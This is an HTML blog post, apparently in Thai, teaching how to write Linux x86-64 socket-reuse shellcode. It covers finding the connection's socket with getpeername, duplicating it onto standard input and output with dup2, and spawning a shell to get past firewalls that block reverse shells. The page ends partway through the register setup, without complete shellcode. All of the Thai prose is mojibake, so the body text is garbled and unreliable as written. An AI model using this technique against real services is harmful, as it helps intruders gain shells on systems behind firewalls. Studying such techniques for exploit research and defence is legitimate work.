<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

<title>
  
     Linux x86-64 Execve with Socket Reuse | 
    SUAM
  
</title><meta name="description" content="‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô Shellcode ‡∏ó‡∏≥ Socket Reuse ‡∏ö‡∏ô Linux x86-64 ‡∏¢‡∏±‡∏á‡πÑ‡∏á ‡∏°‡∏≤‡∏î‡∏π‡∏Å‡∏±‡∏ô‡∏Ñ‡πâ‡∏≤‡∏ö"><meta name="author" content="Jusmistic">

<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180">
<link rel="icon" href="/favicon-32x32.png " sizes="32x32" type="image/png">
<link rel="icon" href="/favicon-16x16.png" sizes="16x16" type="image/png">
<link rel="manifest" href="/manifest.json">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#0c344b">
<link rel="icon" href="/favicon.ico">


<script async src="https://www.googletagmanager.com/gtag/js?id=UA-173363806-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-173363806-1');
</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/themes/prism.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
<link rel="stylesheet" href="/dist/main.min.css"><link rel="canonical" href="https://suam.wtf/posts/linux-x86-64-socket-reuse/"><meta property="og:title" content="Linux x86-64 Execve with Socket Reuse" />
<meta property="og:description" content="‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô Shellcode ‡∏ó‡∏≥ Socket Reuse ‡∏ö‡∏ô Linux x86-64 ‡∏¢‡∏±‡∏á‡πÑ‡∏á ‡∏°‡∏≤‡∏î‡∏π‡∏Å‡∏±‡∏ô‡∏Ñ‡πâ‡∏≤‡∏ö" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://suam.wtf/posts/linux-x86-64-socket-reuse/" /><meta property="og:image" content="https://i.imgur.com/4imapAs.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-03-22T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-03-22T00:00:00+00:00" />
<meta itemprop="name" content="Linux x86-64 Execve with Socket Reuse">
<meta itemprop="description" content="‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô Shellcode ‡∏ó‡∏≥ Socket Reuse ‡∏ö‡∏ô Linux x86-64 ‡∏¢‡∏±‡∏á‡πÑ‡∏á ‡∏°‡∏≤‡∏î‡∏π‡∏Å‡∏±‡∏ô‡∏Ñ‡πâ‡∏≤‡∏ö"><meta itemprop="datePublished" content="2021-03-22T00:00:00+00:00" />
<meta itemprop="dateModified" content="2021-03-22T00:00:00+00:00" />
<meta itemprop="wordCount" content="2156"><meta itemprop="image" content="https://i.imgur.com/4imapAs.png">
<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://i.imgur.com/4imapAs.png"/>

<meta name="twitter:title" content="Linux x86-64 Execve with Socket Reuse"/>
<meta name="twitter:description" content="‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô Shellcode ‡∏ó‡∏≥ Socket Reuse ‡∏ö‡∏ô Linux x86-64 ‡∏¢‡∏±‡∏á‡πÑ‡∏á ‡∏°‡∏≤‡∏î‡∏π‡∏Å‡∏±‡∏ô‡∏Ñ‡πâ‡∏≤‡∏ö"/>

</head>
<body>
    
<nav class="navbar navbar-expand-md navbar-light bg-light fixed-top shadow-sm" id="navbar-main-menu">
    <div class="container">
        <a class="navbar-brand font-weight-bold" href="https://suam.wtf/">SUAM</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-menu" aria-controls="main-menu" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="main-menu">
            <ul class="navbar-nav ml-auto">
                
                    <li class="nav-item"><a class="nav-link" href="/">Home</a></li>
                
                    <li class="nav-item"><a class="nav-link" href="/about">About</a></li>
                
            
                <li class="nav-item">
                    <a href="https://webring.wonderful.software#suam.wtf" title="‡∏ß‡∏á‡πÅ‡∏´‡∏ß‡∏ô‡πÄ‡∏ß‡πá‡∏ö" target="_blank" class="nav-link" rel="noopener">
                        <img src="/images/webring.black.svg" width="25px" height="25px" alt="‡∏ß‡∏á‡πÅ‡∏´‡∏ß‡∏ô‡πÄ‡∏ß‡πá‡∏ö" />
                    </a>
                </li>
            </ul>
        </div>
    </div>
</nav>


    
<main class="content-page container pt-7 pb-5">
    
    <div class="row">
        <div class="col">
            <article>
                <div class="row justify-content-center">
                    <div class="col-lg-8">
                        <div class="meta text-muted mb-3">
                            <p class="created text-muted text-uppercase font-weight-bold mb-1">March 22, 2021</p>
                            <span class="mr-2"><i class="fas fa-book-open mr-2"></i>2156 words</span>
                            <span><i class="fas fa-clock mr-2"></i>11 mins read</span>
                        </div>

                        <h1>Linux x86-64 Execve with Socket Reuse</h1>

                        <ul class="authors list-inline"><li class="list-inline-item mr-3">
                    <div class="media author"><a href="/authors/jusmistic/" class="mr-3">
                                    <picture>
                                        <source srcset="/authors/jusmistic/Jusmistic_hub264f75c206ecb3907db6dab637b8dcc_222307_64x0_resize_q75_box.jpg 1x, /authors/jusmistic/Jusmistic_hub264f75c206ecb3907db6dab637b8dcc_222307_128x0_resize_q100_box.jpg 2x, /authors/jusmistic/Jusmistic_hub264f75c206ecb3907db6dab637b8dcc_222307_192x0_resize_q100_box.jpg 3x">
                                        <img src="/authors/jusmistic/Jusmistic_hub264f75c206ecb3907db6dab637b8dcc_222307_64x0_resize_q75_box.jpg" class="rounded-circle" alt="Jusmistic">
                                    </picture>
                                </a><div class="media-body">
                            <h5 class="name my-0"><a href="/authors/jusmistic/" class="small">Jusmistic</a>
                            </h5><p class="social small text-muted">
                                    <a href="https://twitter.com/@giiir4ffe">@Giiir4ffe</a>
                                </p></div>
                    </div>
                </li></ul>
                    </div>
                </div><div class="row justify-content-center">
                    <div class="col-lg-8">
                        <div class="content">
                            <p><img src="https://i.imgur.com/4imapAs.png" alt="cover"></p>
<p>‡∏ä‡πà‡∏ß‡∏á‡∏ô‡∏µ‡πâ‡∏≠‡πà‡∏≤‡∏ô‡πÄ‡∏£‡∏∑‡πà‡∏≠‡∏á socket reuse ‡∏î‡∏π‡πÄ‡∏´‡πá‡∏ô Material ‡πÄ‡∏õ‡πá‡∏ô x86 ‡∏ã‡∏∞‡∏™‡πà‡∏ß‡∏ô‡πÉ‡∏´‡∏ç‡πà ‡∏¢‡∏±‡∏á‡πÑ‡∏°‡πà‡πÄ‡∏´‡πá‡∏ô shellcode ‡∏ó‡∏µ‡πà‡πÄ‡∏õ‡πá‡∏ô x86-64 ‡πÄ‡∏•‡∏¢ (‡∏ú‡∏°‡∏û‡∏¢‡∏≤‡∏¢‡∏≤‡∏°‡∏´‡∏≤‡πÅ‡∏•‡πâ‡∏ß ‡πÅ‡∏ï‡πà‡πÑ‡∏°‡πà‡πÄ‡∏à‡∏≠‡∏≠‡πà‡∏∞ ‡πÉ‡∏Ñ‡∏£‡πÄ‡∏à‡∏≠‡πÄ‡∏°‡πâ‡∏ô‡∏ö‡∏≠‡∏Å‡∏î‡πâ‡∏ß‡∏¢‡∏ô‡∏∞‡∏Ñ‡∏£‡∏±‡∏ö)</p>
<p>‡πÇ‡∏î‡∏¢‡∏õ‡∏Å‡∏ï‡∏¥‡πÅ‡∏•‡πâ‡∏ß‡πÄ‡∏ó‡∏Ñ‡∏ô‡∏¥‡∏Ñ‡∏ô‡∏µ‡πâ‡∏Ñ‡πà‡∏≠‡∏ô‡∏Ç‡πâ‡∏≤‡∏á‡πÄ‡∏Å‡πà‡∏≤ ‡∏™‡πà‡∏ß‡∏ô‡∏ï‡∏±‡∏ß‡πÑ‡∏°‡πà‡πÄ‡∏Ñ‡∏¢‡πÉ‡∏ä‡πâ ‡πÄ‡∏ó‡∏Ñ‡∏ô‡∏¥‡∏Ñ‡∏ô‡∏µ‡πâ‡∏°‡∏≤‡∏Å‡πà‡∏≠‡∏ô‡πÄ‡∏ö‡∏¢ ‡∏ñ‡∏∑‡∏≠‡πÇ‡∏≠‡∏Å‡∏≤‡∏™‡∏≠‡πà‡∏∞‡∏•‡∏≠‡∏á‡∏ó‡∏≥‡∏ã‡∏±‡∏Å‡∏´‡∏ô‡πà‡∏≠‡∏¢ ‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏ô‡πâ‡∏≠‡∏¢ ‡πÜ ‡∏Å‡πá‡∏ñ‡∏∑‡∏≠‡∏ß‡πà‡∏≤‡∏´‡∏±‡∏î‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô Assembly ‡∏Ç‡∏≥ ‡πÜ</p>
<p>‡∏ö‡∏≠‡∏Å‡∏Å‡πà‡∏≠‡∏ô‡∏ß‡πà‡∏≤ Ref ‡∏™‡πà‡∏ß‡∏ô‡πÉ‡∏´‡∏ç‡πà‡∏ú‡∏°‡∏≠‡πà‡∏≤‡∏ô‡∏°‡∏≤‡∏à‡∏≤‡∏Å x86 ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏î‡∏π‡∏ß‡πà‡∏≤‡∏´‡∏•‡∏±‡∏Å ‡πÜ ‡πÅ‡∏•‡πâ‡∏ß‡∏Å‡∏≤‡∏£‡∏ó‡∏≥ socket reuse ‡∏ï‡πâ‡∏≠‡∏á‡∏ó‡∏≥‡∏≠‡∏∞‡πÑ‡∏£‡∏ö‡πâ‡∏≤‡∏á ‡πÅ‡∏•‡πâ‡∏ß‡πÄ‡∏≠‡∏≤‡∏°‡∏≤‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÉ‡∏´‡∏°‡πà‡∏ö‡∏ô x86-64 ‡πÅ‡∏Ñ‡πà‡∏ô‡∏±‡πâ‡∏ô‡πÄ‡∏•‡∏¢ ‡πÑ‡∏°‡πà‡∏¢‡∏≤‡∏Å ‡∏ã‡∏∂‡πà‡∏á‡πÇ‡∏Ñ‡∏£‡∏á‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏´‡∏•‡∏±‡∏Å ‡πÜ ‡πÄ‡∏≠‡∏≤‡∏°‡∏≤‡∏à‡∏≤‡∏Å‡∏ö‡∏ó‡∏Ñ‡∏ß‡∏≤‡∏°‡∏ô‡∏µ‡πâ‡∏Ç‡∏≠‡πÉ‡∏´‡πâ‡πÄ‡∏Ñ‡∏£‡∏î‡∏¥‡∏ï‡πÑ‡∏õ‡πÄ‡∏ï‡πá‡∏°‡∏ú‡∏°‡πÅ‡∏Ñ‡πà‡∏Å‡πá‡∏≠‡∏õ‡πÅ‡∏ô‡∏ß‡∏Ñ‡∏¥‡∏î‡∏°‡∏≤‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÉ‡∏´‡∏°‡πà‡∏≠‡πà‡∏∞</p>
<p><a href="https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/">Linux x86 One-Way Shellcode (Socket Reuse)</a></p>
<h2 id="socket-reuse-‡∏Ñ‡∏≠‡∏≠‡∏∞‡πÑ‡∏£-what">Socket Reuse ‡∏Ñ‡∏∑‡∏≠‡∏≠‡∏∞‡πÑ‡∏£? (What)</h2>
<blockquote>
<p>‡∏ú‡∏°‡∏ß‡πà‡∏≤‡∏ú‡∏°‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÑ‡∏°‡πà‡∏Ñ‡πà‡∏≠‡∏¢‡∏î‡∏µ‡∏≠‡πà‡∏∞ ‡∏ß‡πà‡∏≤‡∏à‡∏∞‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢ shellcode ‡πÄ‡∏â‡∏¢ ‡πÜ ‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ‡∏à‡∏∞‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡∏ó‡∏§‡∏©‡∏é‡∏µ ‡∏Ç‡∏µ‡πâ‡πÄ‡∏Å‡∏µ‡∏¢‡∏à‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡∏î‡πâ‡∏ß‡∏¢ ‡∏ñ‡πâ‡∏≤‡πÑ‡∏°‡πà‡∏≠‡∏¢‡∏≤‡∏Å‡∏£‡∏π‡πâ‡∏Å‡πá‡∏Ç‡πâ‡∏≤‡∏°‡πÑ‡∏°‡πà‡∏≠‡πà‡∏≤‡∏ô‡∏´‡∏±‡∏ß‡∏Ç‡πâ‡∏≠‡∏ñ‡∏±‡∏î‡πÑ‡∏õ‡πÄ‡∏•‡∏¢‡∏Ñ‡πâ‡∏≤‡∏ö‡∏ö</p>
</blockquote>
<p>‡∏õ‡∏Å‡∏ï‡∏¥‡πÅ‡∏•‡πâ‡∏ß‡πÉ‡∏ô Linux ‡∏à‡∏∞‡πÉ‡∏ä‡πâ‡∏™‡∏¥‡πà‡∏á‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏µ‡∏¢‡∏Å‡∏ß‡πà‡∏≤ File Descriptor (FD) ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡πÄ‡∏Ç‡πâ‡∏≤‡∏ñ‡∏∂‡∏á Input/Output ‡∏ï‡πà‡∏≤‡∏á ‡πÜ ‡πÄ‡∏ä‡πà‡∏ô ‡πÑ‡∏ü‡∏•‡πå ‡∏ã‡∏∂‡πà‡∏á‡πÉ‡∏ô Linux ‡πÄ‡∏≠‡∏á‡∏à‡∏∞‡∏°‡∏µ FD ‡∏û‡∏∑‡πâ‡∏ô‡∏ê‡∏≤‡∏ô‡∏´‡∏•‡∏±‡∏Å ‡πÜ ‡∏Ñ‡∏∑‡∏≠</p>
<ul>
<li>STDIN ‡πÉ‡∏ä‡πâ 0 ‡πÄ‡∏õ‡πá‡∏ô‡∏Ñ‡πà‡∏≤ reference</li>
<li>STDOUT ‡πÉ‡∏ä‡πâ 1 ‡πÄ‡∏õ‡πá‡∏ô‡∏Ñ‡πà‡∏≤ reference</li>
<li>STDERR ‡πÉ‡∏ä‡πâ 2 ‡πÄ‡∏õ‡πá‡∏ô‡∏Ñ‡πà‡∏≤ reference</li>
</ul>
<p>‡∏à‡∏≤‡∏Å‡∏•‡∏¥‡∏™‡∏ó‡πå‡∏î‡πâ‡∏≤‡∏ô‡∏ö‡∏ô‡∏à‡∏∞‡πÄ‡∏´‡πá‡∏ô‡∏ß‡πà‡∏≤‡∏à‡∏£‡∏¥‡∏á ‡πÜ ‡πÅ‡∏•‡πâ‡∏ß FD ‡∏à‡∏∞‡∏ñ‡∏π‡∏Å‡∏≠‡πâ‡∏≤‡∏á‡∏≠‡∏¥‡∏á‡∏à‡∏≤‡∏Å‡∏ï‡∏±‡∏ß‡πÄ‡∏•‡∏Ç ‡πÇ‡∏î‡∏¢‡∏õ‡∏Å‡∏ï‡∏¥‡∏ñ‡πâ‡∏≤‡πÇ‡∏õ‡∏£‡πÅ‡∏Å‡∏£‡∏°‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£‡∏™‡∏£‡πâ‡∏≤‡∏á FD ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏Ñ‡∏∏‡∏¢‡∏Å‡∏±‡∏ö‡∏≠‡∏∞‡πÑ‡∏£‡∏ö‡∏≤‡∏á‡∏≠‡∏¢‡πà‡∏≤‡∏á(socket/file) ‡∏°‡∏±‡∏ô‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏£‡∏±‡∏ô‡∏à‡∏≤‡∏Å‡∏Ñ‡πà‡∏≤‡∏ó‡∏µ‡πà‡∏ï‡πà‡∏≥‡∏ó‡∏µ‡πà‡∏™‡∏∏‡∏î ‡∏ã‡∏∂‡πà‡∏á‡πÉ‡∏ô‡∏ó‡∏µ‡πà‡∏ô‡∏µ‡πâ‡∏Ñ‡∏∑‡∏≠ 3 ‡πÅ‡∏•‡πâ‡∏ß‡∏Å‡πá‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Ç‡∏∂‡πâ‡∏ô‡πÑ‡∏õ‡πÄ‡∏£‡∏∑‡πà‡∏≠‡∏¢ ‡πÜ</p>
<p>‡πÉ‡∏ô‡∏ö‡∏≤‡∏á‡πÇ‡∏õ‡∏£‡πÅ‡∏Å‡∏£‡∏°‡∏à‡∏∞‡∏°‡∏µ‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏Å‡∏±‡∏ö‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ ‡πÇ‡∏î‡∏¢‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ‡πÉ‡∏ä‡πâ STDIN ‡πÅ‡∏•‡∏∞ STDOUT ‡πÅ‡∏ï‡πà‡∏à‡∏∞‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô socket ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏£‡∏±‡∏ö connection ‡∏ú‡πà‡∏≤‡∏ô‡∏ó‡∏≤‡∏á network ‡πÅ‡∏ó‡∏ô ‡∏ó‡∏≥‡πÉ‡∏´‡πâ‡πÇ‡∏õ‡∏£‡πÅ‡∏Å‡∏£‡∏°‡∏à‡∏∞‡∏™‡∏£‡πâ‡∏≤‡∏á FD ‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÅ‡∏•‡∏∞‡∏ï‡∏¥‡∏î‡∏ï‡πà‡∏≠‡∏Å‡∏±‡∏ö‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡∏ú‡πà‡∏≤‡∏ô FD ‡πÉ‡∏´‡∏°‡πà</p>
<p>‡∏´‡∏•‡∏±‡∏á‡∏à‡∏≤‡∏Å‡∏ó‡∏µ‡πà‡πÅ‡∏•‡πâ‡∏ß spawn shell ‡πÅ‡∏•‡πâ‡∏ß‡∏ï‡∏±‡∏ß shell ‡∏à‡∏∞‡πÉ‡∏ä‡πâ STDIN ‡πÅ‡∏•‡∏∞ STDOUT ‡∏õ‡∏Å‡∏ï‡∏¥‡∏≠‡∏¢‡∏π‡πà ‡∏ó‡∏≥‡πÉ‡∏´‡πâ‡πÄ‡∏£‡∏≤‡∏ï‡πâ‡∏≠‡∏á‡πÉ‡∏ä‡πâ‡πÄ‡∏ó‡∏Ñ‡∏ô‡∏¥‡∏Ñ Socket Reuse ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÉ‡∏´‡πâ‡πÄ‡∏£‡∏≤‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏ï‡∏¥‡∏î‡∏ï‡πà‡∏≠‡∏Å‡∏±‡∏ö shell ‡∏à‡∏≤‡∏Å FD ‡∏Ç‡∏≠‡∏á socket ‡∏ô‡∏±‡πà‡∏ô‡πÄ‡∏≠‡∏á</p>
<h2 id="‡πÄ‡∏°‡∏≠‡πÑ‡∏£‡πÅ‡∏•‡∏∞‡∏ó‡∏≥‡πÑ‡∏°‡∏ï‡∏≠‡∏á‡∏ó‡∏≥-socket-reuse-whenwhy">‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÑ‡∏£‡πÅ‡∏•‡∏∞‡∏ó‡∏≥‡πÑ‡∏°‡∏ï‡πâ‡∏≠‡∏á‡∏ó‡∏≥ Socket Reuse (When/Why)</h2>
<p>‡∏™‡πà‡∏ß‡∏ô‡∏ï‡∏±‡∏ß‡∏ú‡∏°‡πÄ‡∏Ç‡πâ‡∏≤‡πÉ‡∏à‡∏ß‡πà‡∏≤ Socket Reuse ‡∏°‡∏±‡∏ô‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πà‡πÄ‡∏ó‡∏Ñ‡∏ô‡∏¥‡∏Ñ‡∏ó‡∏µ‡πà‡πÉ‡∏ä‡πâ‡πÇ‡∏à‡∏°‡∏ï‡∏µ ‡πÅ‡∏ï‡πà‡πÉ‡∏ä‡πâ Bypass Exploit Mitigation ‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏ô‡∏∂‡∏á‡∏ã‡∏∂‡πà‡∏á‡∏´‡∏•‡∏±‡∏Å ‡πÜ ‡πÄ‡∏•‡∏¢‡∏Ñ‡∏∑‡∏≠ <strong>Service ‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡πÑ‡∏õ‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡∏°‡∏±‡∏ô‡∏≠‡∏¢‡∏π‡πà‡∏´‡∏•‡∏±‡∏á Firewall ‡πÅ‡∏•‡πâ‡∏ß‡πÄ‡∏£‡∏≤‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏ó‡∏≥ Bind/Reverse Shell ‡πÑ‡∏î‡πâ</strong> ‡πÄ‡∏£‡∏≤‡πÄ‡∏•‡∏¢‡∏ï‡πâ‡∏≠‡∏á‡∏°‡∏≤‡πÉ‡∏ä‡πâ FD ‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡∏ï‡∏¥‡∏î‡∏ï‡πà‡∏≠‡∏Å‡∏±‡∏ö service ‡∏ô‡∏±‡πâ‡∏ô‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ï‡∏¥‡∏î‡∏ï‡πà‡∏≠‡∏Å‡∏±‡∏ö shell ‡∏Ç‡∏≠‡∏á‡πÄ‡∏£‡∏≤‡πÅ‡∏ó‡∏ô</p>
<h2 id="‡∏Å‡∏≤‡∏£‡∏ó‡∏≥-socket-reuse-how">‡∏Å‡∏≤‡∏£‡∏ó‡∏≥ Socket Reuse (How)</h2>
<p>‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏ö‡∏≠‡∏Å‡πÑ‡∏õ‡∏ï‡∏≠‡∏ô‡∏ï‡πâ‡∏ô Socket Reuse ‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πà‡πÄ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÉ‡∏´‡∏°‡πà ‡∏ú‡∏°‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ‡πÄ‡∏õ‡πá‡∏ô‡∏Ñ‡∏ô‡∏Ñ‡∏¥‡∏î ‡∏ú‡∏°‡πÅ‡∏Ñ‡πà‡∏Å‡πá‡∏≠‡∏õ concept ‡∏°‡∏≤‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÉ‡∏´‡∏°‡πà‡πÄ‡∏õ‡πá‡∏ô x86-64 ‡πÄ‡∏û‡∏£‡∏≤‡∏∞‡∏ú‡∏°‡∏¢‡∏±‡∏á‡πÑ‡∏°‡πà‡πÄ‡∏´‡πá‡∏ô‡πÉ‡∏Ñ‡∏£‡∏ó‡∏≥‡πÄ‡∏â‡∏¢ ‡πÜ ‡∏ß‡∏±‡∏ô‡∏´‡∏•‡∏±‡∏á‡∏ñ‡πâ‡∏≤‡∏°‡∏µ‡∏Ñ‡∏ô‡∏≠‡∏¢‡∏≤‡∏Å‡∏ó‡∏≥‡∏à‡∏∞‡πÑ‡∏î‡πâ‡πÄ‡∏≠‡∏≤ shellcode ‡πÑ‡∏õ‡πÉ‡∏ä‡πâ‡∏´‡∏£‡∏∑‡∏≠‡πÇ‡∏°‡πÑ‡∏î‡πâ‡∏á‡πà‡∏≤‡∏¢ ‡πÜ</p>
<p><strong>‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô‡∏Å‡∏≤‡∏£‡∏ó‡∏≥ Socket Reuse ‡∏°‡∏µ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î 3 ‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô</strong></p>
<ol>
<li>‡∏´‡∏≤ sockfd ‡πÇ‡∏î‡∏¢‡πÉ‡∏ä‡πâ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô getpeername</li>
<li>‡πÉ‡∏ä‡πâ dup2 system call ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ó‡∏≥‡πÉ‡∏´‡πâ FD 0, 1, ‡πÅ‡∏•‡∏∞ 2 ‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏Å‡∏±‡∏ö sockfd ‡∏Ç‡∏≠‡∏á‡πÄ‡∏£‡∏≤</li>
<li>‡πÄ‡∏£‡∏µ‡∏¢‡∏Å shell</li>
</ol>
<h3 id="1-‡∏´‡∏≤-sockfd-‡πÇ‡∏î‡∏¢‡πÉ‡∏ä‡∏ü‡∏á‡∏Å‡∏ä‡∏ô-getpeername">1. ‡∏´‡∏≤ sockfd ‡πÇ‡∏î‡∏¢‡πÉ‡∏ä‡πâ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô getpeername</h3>
<p>‡πÄ‡∏£‡∏≤‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô getpeername ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ß‡πà‡∏≤‡πÄ‡∏•‡∏Ç FD ‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏™‡πà‡∏á‡πÄ‡∏Ç‡πâ‡∏≤‡πÑ‡∏õ‡∏ô‡∏±‡πâ‡∏ô‡πÄ‡∏õ‡πá‡∏ô FD ‡∏Ç‡∏≠‡∏á socket ‡∏£‡∏∂‡πÄ‡∏õ‡∏•‡πà‡∏≤‡∏ã‡∏∂‡πà‡∏á‡πÄ‡∏õ‡πá‡∏ô‡∏Ñ‡πà‡∏≤‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£‡∏´‡∏≤‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ô‡∏≥‡∏°‡∏≤‡πÉ‡∏ä‡πâ</p>
<p>‡∏ã‡∏∂‡πà‡∏á‡∏à‡∏≤‡∏Å <a href="https://man7.org/linux/man-pages/man2/getpeername.2.html">man-page</a> getpeername ‡∏°‡∏µ‡∏£‡∏≤‡∏¢‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î‡∏î‡∏±‡∏á‡∏ô‡∏µ‡πâ</p>
<pre><code class="language-c">int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
</code></pre>
<p>‡∏´‡∏≤‡∏Å‡∏ß‡πà‡∏≤ sockfd ‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏™‡πà‡∏á‡πÄ‡∏Ç‡πâ‡∏≤‡πÑ‡∏õ‡∏ó‡∏µ‡πà getpeername system call ‡∏ô‡∏±‡πâ‡∏ô‡πÄ‡∏õ‡πá‡∏ô FD ‡∏Ç‡∏≠‡∏á socket ‡∏à‡∏£‡∏¥‡∏á ‡πÜ ‡∏Ñ‡πà‡∏≤‡∏ó‡∏µ‡πà‡∏ï‡∏≠‡∏ö‡∏Å‡∏•‡∏±‡∏ö‡∏°‡∏≤‡πÉ‡∏ô RAX ‡∏à‡∏∞‡πÄ‡∏õ‡πá‡∏ô 0</p>
<p>‡∏ã‡∏∂‡πà‡∏á‡∏ñ‡πâ‡∏≤‡πÄ‡∏£‡∏≤‡∏à‡∏∞‡πÄ‡∏£‡∏µ‡∏¢‡∏Å‡∏ú‡πà‡∏≤‡∏ô syscall ‡πÄ‡∏£‡∏≤‡∏ï‡πâ‡∏≠‡∏á‡∏à‡∏±‡∏î‡∏Å‡∏≤‡∏£ register ‡πÉ‡∏´‡πâ‡∏°‡∏µ‡∏Ñ‡πà‡∏≤‡∏î‡∏±‡∏á‡∏ô‡∏µ‡πâ <strong>‡πÄ‡∏Å‡πà‡∏á‡∏õ‡πà‡∏∞? ‡∏à‡∏£‡∏¥‡∏á ‡πÜ <a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">‡πÅ‡∏•‡πâ‡∏ß‡∏Å‡πá‡∏≠‡∏õ‡∏°‡∏≤‡∏à‡∏≤‡∏Å‡∏ô‡∏µ‡πà‡∏à‡πâ‡∏≤</a></strong></p>
<ul>
<li><strong>RAX</strong> =¬†0x34 ‚áí ‡∏Ñ‡πà‡∏≤ syscall ‡∏Ç‡∏≠‡∏á getpeername</li>
<li><strong>RDI</strong> =¬†sockfd ‚áí ‡πÄ‡∏•‡∏Ç FD ‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö</li>
<li><strong>RSI</strong> =¬†*addr ‚áí pointer ‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡∏û‡∏∑‡πâ‡∏ô‡∏ó‡∏µ‡πà‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£‡πÄ‡∏Å‡πá‡∏ö‡∏Ç‡πâ‡∏≠ address ‡∏ó‡∏µ‡πà‡πÄ‡∏Å‡∏µ‡πà‡∏¢‡∏ß‡∏Å‡∏±‡∏ö FD (16 bytes)</li>
